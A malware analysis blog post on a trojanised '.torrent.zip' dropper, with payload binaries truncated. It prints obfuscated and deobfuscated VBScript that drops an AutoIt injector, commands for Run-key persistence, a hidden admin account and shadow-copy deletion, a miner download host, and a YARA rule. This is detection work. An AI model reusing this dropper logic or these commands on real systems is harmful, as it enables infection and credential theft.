# All Your Torrents Belong To Us

![](https://i.imgur.com/LC3W2NW.png)

```
Follow the research at #AllYourTorrentsBelongToUs
https://twitter.com/hashtag/AllYourTorrentsBelongToUs
```

**Important:**
*I don't know why, but some people are having trouble loading the web page correctly. In that case reload the page or use a computer instead of a mobile device. You should find some Virus Total screenshots and a Yara Rule at the end of this article. Thanks*

A few days ago, a friend told me that something strange happened every time he tried to download a torrent from some **spanish torrent  sites**...

The first time you click on the **download torrent** button:

![](https://i.imgur.com/1IlxO6I.png)

You will download a file with this pattern as name:

```
[TorrentName].torrent.zip
```

But **if you click again you will download a .torrent** file...

![](https://i.imgur.com/SIS8tXM.jpg)

Looking into the supposed zipped torrent file a .vbs file is found.

![](https://i.imgur.com/ArWIrRR.png)

The .vbs file looks pretty obfuscated:

![](https://i.imgur.com/TaYbXWB.png)

Playing with the obfuscated code, a script in "clear text" is obtained:

```vbscript
ON ERROR RESUME NEXT

 if CreateObject(OrvRu("Qapkrvkle,DkngQ{qvgoM`hgav",2)).GetParentFolderName(WScript.ScriptFullName) = "C:\" then
 wscript.quit
 end if
 dim dEsFPZKKXwnYmBUDTqXe, KwxZCOQtvTSpXWawuUecfit, oWBOsqWfANRUqJiFXToLNPBEg, UiFbUrspphuZurdINVnlzmLMCOzhIn, TyoGpdeMyLEpaOMXCkCBcbYBzv,olcDVtpAtSEPtVAUodd,UiFbUrspphuZurdINVnlzmLMCOzh,JkNTyBMjOwyjKJOfpMWZ, MlVQvmywSW,dRTqwSHVcRAnOfVyzCM,DeSHPpoHECNPA 

 dRTqwSHVcRAnOfVyzCM = OrvRu("VSXSU9Dcervz",23)
 
 function jZKLbgjUlj(sMQA,ZoKH)
jZKLbgjUlj= mid(sMQA,ZoKH,1)
End Function

 function OrvRu(sMQA,sNsOT)
  for i = 1 to Len(sMQA)
   OrvRu = OrvRu & chr(asc(jZKLbgjUlj(sMQA,i)) xor sNsOT)
  Next
end function

  Set kPmKMAUYnHoWoLA = CreateObject(dRTqwSHVcRAnOfVyzCM)
kPmKMAUYnHoWoLA.Type = ZVLyGkvISTplQKc
kPmKMAUYnHoWoLA.Open()
    For i = 1 to 900
	kPmKMAUYnHoWoLA.Write olcDVtpAtSEPtVAUodd.NodeTypedValue
		kPmKMAUYnHoWoLA.Write olcDVtpAtSEPtVAUodd.NodeTypedValue
			kPmKMAUYnHoWoLA.Write olcDVtpAtSEPtVAUodd.NodeTypedValue
		next
		
 Set KwxZCOQtvTSpXWawuUecfit = CreateObject(OrvRu("Qapkrvkle,DkngQ{qvgoM`hgav",2))
Set TyoGpdeMyLEpaOMXCkCBcbYBzv = CreateObject(OrvRu("DZQde;'MFDMfj|dlg}",9))

 Set olcDVtpAtSEPtVAUodd = TyoGpdeMyLEpaOMXCkCBcbYBzv.createElement(OrvRu("Khzl?=Mh}h",9))
 
 Set kPmKMAUYnHoWoLA = CreateObject(dRTqwSHVcRAnOfVyzCM)
kPmKMAUYnHoWoLA.Type = ZVLyGkvISTplQKc
kPmKMAUYnHoWoLA.Open()
    For i = 1 to 100
	kPmKMAUYnHoWoLA.Write olcDVtpAtSEPtVAUodd.NodeTypedValue
		next


Function szcRCjdYsgsUwhwlYoMxP
    Dim NvnNYEItVIoXsJ
	Randomize
    Const kUGUYXLpEfwXxgGgIj = "abcdefghijklmnopqrstuvwxyz0123456789"
    For i = 1 to 10
        NvnNYEItVIoXsJ = NvnNYEItVIoXsJ & Mid( kUGUYXLpEfwXxgGgIj, Int((24-1+1)*rnd+1), 1 )
    Next
    szcRCjdYsgsUwhwlYoMxP = NvnNYEItVIoXsJ
End Function

'norton scantime-emulation fucker
sleep(1000)

[...Binaries + Lot of Code...]
```

Steps in order to clean the script:

- Function **OrvRu()** decrypt the interesting strings.
- There are a lot of weird variable names like **dEsFPZKKXwnYmBUDTqXe**, **KwxZCOQtvTSpXWawuUecfit**,  **TyoGpdeMyLEpaOMXCkCBcbYBzv** etc... those variables need to be renamed.
- There are a lot of interesting functions, **szcRCjdYsgsUwhwlYoMxP** looks like a string randomizer.
- This comment doesn't need to be deobfuscated... `norton scantime-emulation fucker`.

### String Decryption

These are the functions that decrypt the strings:

```vbscript
function jZKLbgjUlj(sMQA,ZoKH)
jZKLbgjUlj= mid(sMQA,ZoKH,1)
End Function

function OrvRu(sMQA,sNsOT)
  for i = 1 to Len(sMQA)
   OrvRu = OrvRu & chr(asc(jZKLbgjUlj(sMQA,i)) xor sNsOT)
  Next
end function
```

**jZKLbgjUlj** is the same that `Mid(string,start[,length])` function.

**OrvRu** perform XOR ops over the string in order to decipher the data.

Same function but legible:

```vbscript
function unxorString(xoredString,xorValue)
  for i = 1 to Len(xoredString)
   unxorString = unxorString & chr(asc(mid((xoredString,i,1)) xor xorValue)
  Next
end function
```

#### Decoding strings using this python script:

```python
'''
function unxorString(xoredString,xorValue)
  for i = 1 to Len(xoredString)
   unxorString = unxorString & chr(asc(mid((xoredString,i,1)) xor xorValue)
  Next
end function
'''

def unxorString(xoredString, xorValue):

	unxoredString = ""
	for c in xoredString:

		unxoredString += chr(ord(c) ^ xorValue)

	print "{0} {1}".format(unxoredString, xoredString)

unxorString("3,92",92)
unxorString("7<;{74&0ca",85)
unxorString("Azw~~<Sbb~{qsf{}|",18)
unxorString("}$Bkm{lm",30)
unxorString("DZQde;'MFDMfj|dlg}",9)
unxorString("#huh",13)
unxorString("Iep;w|{",21)
unxorString("j3U~`gmf~zUzpz}ld:;Ujdm'lql)&j)[LN)HMM)ABJ\UZFO]^H[LUD`j{fzfo}U^`gmf~zUJ|{{lg}_l{z`fgU[|g)&_)DpHyy)&})[LNVZS)&O)&M)",9)
unxorString("Khzl?=Mh}h",9)
unxorString("M4R^|ai|oc.Hgbk}.&v68'REo}~k|}ew.Bol",14)
unxorString("Nazw~~<fjf",18)
unxorString("o$9$a",65)
unxorString("Qapkrvkle,DkngQ{qvgoM`hgav", 2)
unxorString("VRbshqu/Ridmm",1)
unxorString("VSXSU9Dcervz",23)
unxorString("W.HC}zp{cgHGmg`qy'&Hg|a`p{cz:qlq49r49f49`4$",20)
unxorString("Xpawp*eq7",4)
```

#### Decoded Strings:

```
open
bin.base64
Shell.Application
c:\users
MSXml2.DOMDocument
.exe
\pe.bin
c:\windows\system32\cmd.exe /c REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V MyApp /t REG_SZ /F /D 
Base64Data
C:\Program Files (x86)\Kaspersky Lab
\shell.txt
.exe 
Scripting.FileSystemObject
WScript.Shell
ADODB.Stream
C:\Windows\System32\shutdown.exe -f -r -t 0
\test.au3
```

With these strings now is possible to deobfuscate the code.

### Deobfuscated Code (without binaries)

```vbscript
ON ERROR RESUME NEXT

if CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName) = "C:\" then
	wscript.quit
end if
dim dEsFPZKKXwnYmBUDTqXe, Scripting_FileSystemObject_, oWBOsqWfANRUqJiFXToLNPBEg, ADODB_Stream_ObjectIn, MSXml2_DOMDocument_,Base64Data_,ADODB_Stream_Object,JkNTyBMjOwyjKJOfpMWZ, FullRandomPath,ADODB_Stream_,DeSHPpoHECNPA 

ADODB_Stream_ = "ADODB.Stream"

function unxorString(xoredString,xorValue)
	for i = 1 to Len(xoredString)
		unxorString = unxorString & chr(asc(mid((xoredString,i,1)) xor xorValue)
	Next
end function

Set ADODB_Stream_2 = CreateObject(ADODB_Stream_)
ADODB_Stream_2.Type = VALUE_1
ADODB_Stream_2.Open()
For i = 1 to 900
	ADODB_Stream_2.Write Base64Data_.NodeTypedValue
	ADODB_Stream_2.Write Base64Data_.NodeTypedValue
	ADODB_Stream_2.Write Base64Data_.NodeTypedValue
next

Set Scripting_FileSystemObject_ = CreateObject("Scripting.FileSystemObject")
Set MSXml2_DOMDocument_ = CreateObject("MSXml2.DOMDocument")

Set Base64Data_ = MSXml2_DOMDocument_.createElement("Base64Data")

Set ADODB_Stream_2 = CreateObject(ADODB_Stream_)
ADODB_Stream_2.Type = VALUE_1
ADODB_Stream_2.Open()
For i = 1 to 100
	ADODB_Stream_2.Write Base64Data_.NodeTypedValue
next


Function randomName
	Dim stringRandomName
	Randomize
	Const valuesGenerateRandomName = "abcdefghijklmnopqrstuvwxyz0123456789"
	For i = 1 to 10
		stringRandomName = stringRandomName & Mid( valuesGenerateRandomName, Int((24-1+1)*rnd+1), 1 )
	Next
	randomName = stringRandomName
End Function

'norton scantime-emulation fucker
sleep(1000)

Const VALUE_1     = 1 
Const VALUE_0     = 0 
Const VALUE_2     = 2
Const VALUE_1_too = 1 

Base64Data_.DataType = "bin.base64"

Set ADODB_Stream_Object = CreateObject(ADODB_Stream_)

dim stASRrXPcEXxQodXVNLVDIVnMg
stASRrXPcEXxQodXVNLVDIVnMg=0

For i = 1 to 86
	stASRrXPcEXxQodXVNLVDIVnMg=stASRrXPcEXxQodXVNLVDIVnMg+1
next

Set FileSystemObject_ = CreateObject("Scripting.FileSystemObject")
If (FileSystemObject_.FolderExists("c:\users")) Then
	Base64Data_.text = "T"+chr(ANTIDETECTION_TRICK_SUM_1_to_86)+"...[BINARY_DATA_TRUNCATED]..."
end if
ADODB_Stream_Object.Type = VALUE_1
ADODB_Stream_Object.Open()
randomName_2 = randomName
FullRandomPath =  "C:\"+randomName & "__"

Scripting_FileSystemObject_.CreateFolder(FullRandomPath)
ADODB_Stream_Object.Write Base64Data_.NodeTypedValue

ADODB_Stream_Object.SaveToFile  FullRandomPath+"\"+randomName_2+".exe", VALUE_2

Set Scripting_FileSystemObject_ = CreateObject("Scripting.FileSystemObject")
Set MSXml2_DOMDocument_ = CreateObject("MSXml2.DOMDocument")
Set Base64Data_ = MSXml2_DOMDocument_.createElement("Base64Data")
Base64Data_.DataType = "bin.base64"
Set ADODB_Stream_Object = CreateObject(ADODB_Stream_)
Base64Data_.text = "QVNKSnBhUWdaUWRQ...[BINARY_DATA_TRUNCATED]..."
ADODB_Stream_Object.Type = VALUE_1
ADODB_Stream_Object.Open()
ADODB_Stream_Object.Write Base64Data_.NodeTypedValue
ADODB_Stream_Object.SaveToFile FullRandomPath+"\test.au3", VALUE_2


Set Scripting_FileSystemObject_ = CreateObject("Scripting.FileSystemObject")
Set MSXml2_DOMDocument_ = CreateObject("MSXml2.DOMDocument")
Set Base64Data_ = MSXml2_DOMDocument_.createElement("Base64Data")
Base64Data_.DataType = "bin.base64"
Set ADODB_Stream_Object = CreateObject(ADODB_Stream_)
Base64Data_.text = "lUsskHgpwMDAQQTEMD8/...[BINARY_DATA_TRUNCATED]..."
ADODB_Stream_Object.Type = VALUE_1
ADODB_Stream_Object.Open()
ADODB_Stream_Object.Write Base64Data_.NodeTypedValue
ADODB_Stream_Object.SaveToFile FullRandomPath+"\shell.txt", VALUE_2

Set Scripting_FileSystemObject_=CreateObject("Scripting.FileSystemObject")
Set FileSystemObject_hnd = Scripting_FileSystemObject_.CreateTextFile(FullRandomPath+"\pe.bin",True)
FileSystemObject_hnd.Write "CeOksgZgSM|4fb8rK6sr...[BINARY_DATA_TRUNCATED]..."
FileSystemObject_hnd.Close

If (FileSystemObject_.FolderExists("C:\Program Files (x86)\Kaspersky Lab")) Then
	CreateObject("WScript.Shell").Run("c:\windows\system32\cmd.exe /c REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V MyApp /t REG_SZ /F /D " & chr(34) & FullRandomPath &"\" & randomName_2 &".exe"&chr(34) & FullRandomPath &"\test.au3"&chr(34))
	CreateObject("WScript.Shell").Run("C:\Windows\System32\shutdown.exe -f -r -t 0")
	wscript.quit
end if
If (FileSystemObject_.FolderExists("c:\users")) Then
	
	CreateObject( "Shell.Application" ).ShellExecute FullRandomPath+"\"+randomName_2+".exe", FullRandomPath+"\test.au3", FullRandomPath, "open", 0
end if

```

As we can see the malware will create a folder in:

```
C:\[RandomCharsNum]{10}__
```

For example:

```
C:\erkjnduj2w__
```

![ ](https://i.imgur.com/ATDkmEv.png)

Then will drop 3 files:

- Autoit v3 with random name.
- pe.bin
- shell.txt
- test.au3

Then if `C:\Program Files (x86)\Kaspersky Lab` folder doesn't exist, the script will execute the **AutoIT executable** passing as parameter the file `test.au3`

### Kaspersky Antidetection trick?

I don't know why, but if the script detects that the folder` "C:\Program Files (x86)\Kaspersky Lab"` exists:

It will add a new key in Run with the name `MyApp`in order to run when the computer boots. 

```
c:\windows\system32\cmd.exe /c REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V MyApp /t REG_SZ /F /D
```

Then force reboot.

```
C:\Windows\System32\shutdown.exe -f -r -t 0
```

Maybe this trick avoid the detection by **Kaspersky AV**??

### AutoIT Script

This script read **shell.txt** and **pe.bin** in order to create a new executable.

Then the script will create **vbc.exe** process in suspended state:

![1546103224086](https://i.imgur.com/Wh14piO.png)

Finally the script will inject the malicious payload into **vbc.exe**

Some of the functions used in this phase:

- NtGetContextThread
- NtReadVirtualMemory
- NtWriteVirtualMemory
- NtProtectVirtualMemory
- NtFlushInstructionCache  
- NtUnmapViewOfSection
- NtSetContextThread
- NtResumeThread
- NtFreeVirtualMemory
- NtTerminateProcess

### vbc.exe (Payload)

I have done a **quick analysis** and it has the following features:

#### AV detection

![ ](https://i.imgur.com/ZAsMlSp.png)

```
AVG
avgui.exe 

Nod32
egui.exe 
           
Bitdefender
bdagent    

Avira 
avguard.exe

Norton 
ns.exe             
  
nortonsecurity.exe 
nis.exe            
 
Trend Micro
uiseagnt.exe        
       
McAfee   
mcshield.exe          
mcuicnt.exe 

SUPER AntiSpyware  
superantispyware.exe

Comodo 
vkise.exe           
cis.exe       

MalwareBytes
mbam.exe            
        
ByteFence        
bytefence.exe       
    
Panda
psuaconsole.exe     
               
Search & Destroy
sdscan.exe          
   
Windows Defender
mpcmdrun.exe        
msascuil.exe  
```

#### XMR Miner

```
http://185.185.25.118/cpux64.bin
http://185.185.25.118/cpux86.bin
8afc15525d1b379d4a5172f63c4025c0  cpux64.bin
831fd921948bab5d5ed83eab4a4ea45e  cpux86.bin
```

#### Browser password stealer

```
Mozilla\\Firefox\\Profiles
sqlite
firefox.exe
chrome.exe
\\AppData\\Local\\Google
opera.exe
Mozilla
Google
Opera Software
```

#### Keylogger looking for Cryptocurrency Exchanges and Cryptowallet credentials

![](https://i.imgur.com/s8cTGFH.png)

![](https://i.imgur.com/8E7WA1G.png)

- litecoin core
- bitcoin core
- factores-binance (Second factor Binance)
- metamask (Etherum)
- myether
- kucoin
- cryptopia
- hitbtc
- bittrex
- cryptopia
- coinEx
- bittrex.com
- litebit.eu 
- binance
- hitbtc
- Blockchain Wallet
- Electrum Wallet
- Bitcoin Wallet
- Litecoin Wallet
- Exodus Wallet
- Jaxx Wallet

#### Ransomware?

This string is usual in ransomware but I haven't gone deep enough:

```
/c vssadmin delete shadows /for=c: /all /quiet
```

#### Interesting strings / commands:

```
/c net user /add SafeMode DalasReview0!
/c net localgroup administrators SafeMode /add 
/c net localgroup administradores SafeMode /add
/c net localgroup administrateurs SafeMode /add
deleterestorepoints
updateboturl
updatebotrb
ftprecovery
shutdownmonitor
installrdp
copyrdpcookies
killcookies
recoveryemailpasswords
MailPassView
recoverybrowserpasswords
WebBrowserPassView
recoverybrowsercookieschrome
ChromeCookiesView
recoverybrowsercookiesie
IECookiesView
recoverybrowsercookiesfirefox
MZCookiesView
getbrowserhistory
installplugincapture
shutdownpc
openwebsite
getskypechats
getkeylogs
closeuninstall
downloadurlfiletobot
downloadlocalfiletomemory
downloadlocalfiletothread
downloadlocalfiletobot
replaceminer
fullkillminer
startminer
getbotdata
/c shutdown -f -s -t 0
/c shutdown -f -r -t 0
akamai.la   
utorrentsp2p.nz   
atecoins.la
transferportcrm.com
networkcrsft.com
infoeunetcomfr.com
185.185.25.62
updatebotrb7
updatebotrb6
updatebotrb5
updatebotrb4
updatebotrb3
updatebotrb2
updatebotrb1
```

### cpux86.bin (XMR Miner)

Looking for this strings the names are related mining software:

```
http://185.185.25.118/cpux64.bin
http://185.185.25.118/cpux86.bin
8afc15525d1b379d4a5172f63c4025c0  cpux64.bin
831fd921948bab5d5ed83eab4a4ea45e  cpux86.bin
```

The content of **cpux86.bin**:

```
startminereNrsvQ14VNW1MHxmMgkTDJwEA0aNmpRpGzTVTBNrUoIdzA9RowQIiJXa2GKKbawpTCBq1MQz0ex7Mhpreku/4r1Qcy1X05a2uRgQaUJCBhEh/AiIf9SinnFQwo9kSAL51s8+8wOxtffe9/me530+nofM3mevvfbaa6299tpr77PPbd9tUWIURbHB/9FRRelU+J9L+cf/6uH/xKs2TlQ64t9I77SUvpFevuS+ZWnVSx/40dJ77k/74T0//ekD7rQf3Ju2tOanaff9NK1w9ry0+x9YfO+1EyaMd0gcZUWKUmq5SDkWfOUuE+9hZWLMRRZrqrJ+kqJ86xJFuQweTob/ifC/fxJTh2kr060o4V+l6xLK3HnyEuqXoqQxLP5JZBD6aZmi1MbC7+opyqmp8DswRVG+N0Ynyy5RTlV9MQ9sh6coKWM87/gPwBf7xfWudd9b64bfRf81iQnCvtqiYSqUsoprF9/jvgfSwTjZdzv8bpwUBe
[.......]
5v77l3m9QlDpHUadWr151hSffGnb0ePh6WFCMc=startminerstartminer
```

Looks like the content between `startminer[CONTENT]startminerstartminer` is base64.

Using:

```
base64 -d base64_cpuix86 > decoded_base64_cpuix86
```

File command:

```
file decoded_base64_cpuix86
zlib compressed data <-
```

Script to obtain`uncompressed_zlib_decoded_base64_cpuix86`:

```python
import zlib

with open("decoded_base64_cpuix86", "rb") as f:
	buf = f.read()
	
	des = zlib.decompress(buf)
	
	file_hnd = open("uncompressed_zlib_decoded_base64_cpuix86", "wb") 
	file_hnd.write(des)
	file_hnd.close()
```

The result is an **XMR miner** `uncompressed_zlib_decoded_base64_cpuix86`

```
file uncompressed_zlib_decoded_base64_cpuix86
PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

```
831fd921948bab5d5ed83eab4a4ea45e  cpux86.bin
7209d62428537731e521ee87b36447de  base64_cpuix86
5ef8aab08b3fbef38b80b58eddd778c7  decoded_base64_cpuix86
73e4ad3d8ef1fdf60b785f330cdd10d7  uncompressed_zlib_decoded_base64_cpuix86 <- XMR Miner
```

Looking for **MD5** `73e4ad3d8ef1fdf60b785f330cdd10d7` in VT:

![ ](https://i.imgur.com/q2hzTsE.png)

- https://www.virustotal.com/#/file/f4ce5b76a611f6768c9a035eae1e49f61666f3e5370b54bd447ecc3b0098efcb/detection

## Low detection rate in Virus Total

![](https://i.imgur.com/cEMYFAD.png)

Looking for **.torrent.zip** you will be able to find a lot of similar **.torrent.zips** and the **detection rate is very low**. 

If you look for `.torrent.zip` in **VirusTotal** you are going to find a lot of them.

For example, sample  **MD5 902df385e6598409cc09b074d2e43ecd** with name **Animales_Fantasticos_y_donde_Encontrarlos_MicroHD_1080p.torrent.zip** has **2/59** detections in **VT**:
![](https://i.imgur.com/Xrtnnw3.png)

And the malicious embedded vbe **MD5 4279becbd54aa66f4311dd9c6253358a** has **2/56** detections in **VT**:

![](https://i.imgur.com/97EBMgR.png)

A sandbox should be able to detect those .vbe files as malicious, for that reason I don't understand that low detect ratio.

## Detection

**IMPORTANT:** 

If you don't have experience dealing with malware, please don't delete anything on your computer, **I am not responsible of any damage **.

- Download **Autoruns** from **Microsoft Sysinternals**: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns
  - Check if there is a program that runs when the computer boots.
- Check if there is a program that consumes a lot of CPU.
- Check if there is a folder in `C:\` with a name with this pattern and delete it.

```
[randomName]{10}__ 
Example: erkjnduj2w__
```

Using **YaraEditor** from **Adlice** (https://www.adlice.com/download/yaraeditor/) and using this **Yara rule** in order to scan the memory of all the active processes, you can detect this payload (execute **YaraEditor** with admin privileges)

If you detect a program with this rule, check their path a delete it if you think that is malicious.

```js
rule AllYourTorrentsBelongToUs : malware
{
    meta:
        date = "2018/12/29"
        arch = "X86"
        author = "@51ddh4r7h4"
        blog = "reversingminds-blog.logdown.com"

    strings:
        $string_1 = "/c net localgroup administrators SafeMode /add" ascii wide nocase

        $string_2 = ":::Clipboard:::"

        $string_3 = "/c net user /add SafeMode DalasReview0!" ascii wide nocase
        $string_4 = "/c net localgroup administrators SafeMode /add" ascii wide nocase
        $string_5 = "/c net localgroup administradores SafeMode /add" ascii wide nocase
        $string_6 = "/c net localgroup administrateurs SafeMode /add" ascii wide nocase

        $string_7 = "wireshark" ascii wide nocase

        // Exchanges
        $string_8  = "myether" ascii wide nocase
        $string_9  = "litecoin core" ascii wide nocase
        $string_10 = "factores-Binance" ascii wide nocase
        $string_11 = "metamask" ascii wide nocase
        $string_12 = "kucoin" ascii wide nocase
        $string_13 = "bitcoin core" ascii wide nocase
        $string_14 = "blockchain wallet" ascii wide nocase
        $string_15 = "eth) - log in" ascii wide nocase
        $string_16 = "exchange - balances" ascii wide nocase
        $string_17 = "bittrex.com - input" ascii wide nocase
        $string_18 = "electrum" ascii wide nocase
        $string_19 = "jaxx" ascii wide nocase
        $string_20 = "sign in | coinEx" ascii wide nocase
        $string_21 = "user login - zb spot exchange" ascii wide nocase
        $string_22 = "cryptopia - login" ascii wide nocase
        $string_23 = "binance - iniciar sesi" ascii wide nocase
        $string_24 = "litebit.eu - login" ascii wide nocase
        $string_25 = "binance - log in" ascii wide nocase
        $string_26 = "sign-in / hitbtc" ascii wide nocase
        $string_27 = "exodus 1" ascii wide nocase

        // Wallet
        $string_28 = "Electrum" ascii wide nocase
        $string_29 = "C:\\Program Files (x86)\\Electrum" ascii wide nocase
        $string_30 = "Electrum Wallet detected" ascii wide nocase
        $string_31 = "Bitcoin" ascii wide nocase
        $string_32 = "Bitcoin_Core Wallet detected" ascii wide nocase
        $string_33 = "Litecoin" ascii wide nocase
        $string_34 = "Litecoin_Core Wallet detected" ascii wide nocase
        $string_35 = "Exodus" ascii wide nocase
        $string_36 = "Exodus Wallet detected" ascii wide nocase
        $string_37 = "jaxx" ascii wide nocase
        $string_38 = "Jaxx Wallet detected" ascii wide nocase

        // Download XMR Miner
        $string_39 = "http://185.185.25.118/cpux64.bin" ascii wide nocase
        $string_40 = "http://185.185.25.118/cpux86.bin" ascii wide nocase
                              
        // Navigators                                    
        $string_41 = "Mozilla\\Firefox\\Profiles" ascii wide nocase
        $string_42 = "sqlite" ascii wide nocase
        $string_43 = "firefox.exe" ascii wide nocase
        $string_44 = "chrome.exe" ascii wide nocase
        $string_45 = "opera.exe" ascii wide nocase
        $string_46 = "Mozilla" ascii wide nocase
        $string_47 = "Google" ascii wide nocase
        $string_48 = "Opera Software" ascii wide nocase
        //$string_49 = 
        //$string_50 = 
        $string_51 = "C:\\cookies\\Mozilla" ascii wide nocase
        $string_52 = "C:\\cookies\\Chrome" ascii wide nocase
        $string_53 = "C:\\cookies\\Opera" ascii wide nocase
        $string_54 = "\\AppData\\Local\\Google" ascii wide nocase
                
        $string_55 = "install.txt" ascii wide nocase
        $string_56 = "C:\\Program Files (x86)\\IObit" ascii wide nocase
        $string_57 = "monitor.exe" ascii wide nocase
        $string_58 = "filemanager" ascii wide nocase
        $string_59 = "systeminfo.exe" ascii wide nocase
        $string_60 = "systeminfo -i -o" ascii wide nocase

        // Commands

        $string_61 = "deleterestorepoints" ascii wide nocase
        $string_62 = "ftprecovery" ascii wide nocase
        $string_63 = "shutdownmonitor" ascii wide nocase
        $string_64 = "installrdp" ascii wide nocase
        $string_65 = "copyrdpcookies" ascii wide nocase
        $string_66 = "killcookies" ascii wide nocase
        $string_67 = "recoveryemailpasswords" ascii wide nocase
        $string_68 = "Mail PassView" ascii wide nocase
        $string_69 = "recoverybrowserpasswords" ascii wide nocase
        $string_70 = "WebBrowserPassView" ascii wide nocase
        $string_71 = "recoverybrowsercookieschrome" ascii wide nocase
        $string_72 = "ChromeCookiesView" ascii wide nocase
        $string_73 = "recoverybrowsercookiesie" ascii wide nocase
        $string_74 = "IECookiesView" ascii wide nocase
        $string_75 = "recoverybrowsercookiesfirefox" ascii wide nocase
        $string_76 = "MZCookiesView" ascii wide nocase
        $string_77 = "getbrowserhistory" ascii wide nocase
        $string_78 = "installplugincapture" ascii wide nocase
        $string_79 = "shutdownpc" ascii wide nocase
        $string_80 = "/c shutdown -f -s -t 0" ascii wide nocase
        $string_81 = "/c shutdown -f -r -t 0" ascii wide nocase
        $string_82 = "openwebsite" ascii wide nocase
        $string_83 = "getskypechats" ascii wide nocase
        $string_84 = "getkeylogs" ascii wide nocase
        $string_85 = "closeuninstall" ascii wide nocase
        $string_86 = "downloadurlfiletobot" ascii wide nocase
        $string_87 = "downloadlocalfiletomemory" ascii wide nocase
        $string_88 = "downloadlocalfiletothread" ascii wide nocase
        $string_89 = "downloadlocalfiletobot" ascii wide nocase
        $string_90 = "replaceminer" ascii wide nocase
        $string_91 = "fullkillminer" ascii wide nocase
        $string_92 = "startminer" ascii wide nocase
        $string_93 = "getbotdata" ascii wide nocase
        $string_94 = "updateboturl" ascii wide nocase
        $string_95 = "updatebotrb" ascii wide nocase
        $string_96 = "updatebotrb7" ascii wide nocase
        $string_97 = "updatebotrb6" ascii wide nocase
        $string_98 = "updatebotrb5" ascii wide nocase
        $string_99 = "updatebotrb4" ascii wide nocase
        $string_100 = "updatebotrb3" ascii wide nocase
        $string_101 = "updatebotrb2" ascii wide nocase
        $string_102 = "updatebotrb1" ascii wide nocase

        $string_103 = "getdllcapture" ascii wide nocase
        $string_104 = "dllcaptureok" ascii wide nocase
        $string_105 = "skype.txt" ascii wide nocase
        $string_106 = "lol.exe" ascii wide nocase

        // AV

        $string_107 = "Avast" ascii wide nocase
        $string_108 = "avastui.exe" ascii wide nocase

        $string_109 = "Kaspersky" ascii wide nocase
        $string_110 = "avpui.exe" ascii wide nocase

        $string_111 = "AVG" ascii wide nocase
        $string_112 = "avgui.exe" ascii wide nocase

        $string_113 = "Nod32" ascii wide nocase
        $string_114 = "egui.exe" ascii wide nocase

        $string_115 = "Bitdefender" ascii wide nocase
        $string_116 = "bdagent" ascii wide nocase
 
        $string_117 = "Avira" ascii wide nocase
        $string_118 = "avguard.exe" ascii wide nocase

        $string_119 = "Norton" ascii wide nocase
        $string_120 = "ns.exe" ascii wide nocase

        $string_121 = "nortonsecurity.exe" ascii wide nocase
        $string_122 = "nis.exe" ascii wide nocase

        $string_123 = "Trend Micro" ascii wide nocase
        $string_124 = "uiseagnt.exe" ascii wide nocase
 
        $string_125 = "McAfee" ascii wide nocase
        $string_126 = "mcshield.exe" ascii wide nocase
        $string_127 = "mcuicnt.exe" ascii wide nocase

        $string_128 = "SUPER AntiSpyware" ascii wide nocase
        $string_129 = "superantispyware.exe" ascii wide nocase

        $string_130 = "Comodo" ascii wide nocase
        $string_131 = "vkise.exe" ascii wide nocase
        $string_132 = "cis.exe" ascii wide nocase

        $string_133 = "MalwareBytes" ascii wide nocase
        $string_134 = "mbam.exe" ascii wide nocase
 
        $string_135 = "ByteFence" ascii wide nocase
        $string_136 = "bytefence.exe" ascii wide nocase

        $string_137 = "Panda" ascii wide nocase
        $string_138 = "psuaconsole.exe" ascii wide nocase
       
        $string_139 = "Search & Destroy" ascii wide nocase
        $string_140 = "sdscan.exe" ascii wide nocase

        $string_141 = "Windows Defender" ascii wide nocase
        $string_142 = "mpcmdrun.exe" ascii wide nocase
        $string_143 = "msascuil.exe" ascii wide nocase

    condition:
        75 of ($string_*)
}
```

- If you don't have one, install an antivirus as soon as possible.

### Analysed Samples

| Name                                      | MD5                              | VirusTotal Detections |
| ----------------------------------------- | -------------------------------- | --------------------- |
| promesa-al-amanecer-blurayrip.torrent.zip | fe41de203a01dfdd28ef129688fa9ce0 | 7/58                  |
| promesa-al-amanecer-blurayrip.torrent.vbe | a1b2a2aa8eed485d09673de47e1858a1 | 8/56                  |
| rqrhafpscw.exe (AutoIT)                   | b06e67f9767e5023892d9698703ad098 | 1/70                  |
| test.au3                                  | ba319ca5edf5c36c2c266ef870dbabe5 | 0/57                  |
| pe.bin                                    | 5181dc0732e74c030be5739ca56352c8 | 0/56                  |
| shell.txt                                 | 39eee04505d93c8af96d78f4d43b8f58 | 2/58                  |



## Important note for researchers

While I was downloading zipped torrents (malware) from torrent sites, I have noticed that sometimes, by some reason, the sites stop downloading malware (Even if I use different IPs)

And if you want to continue analysing this, I would appreciate that you share the info via Twitter using this hashtag:

```
Follow the research at #AllYourTorrentsBelongToUs
https://twitter.com/hashtag/AllYourTorrentsBelongToUs
```

Thanks in advance

**Author:** [@51ddh4r7h4](https://twitter.com/51ddh4r7h4)
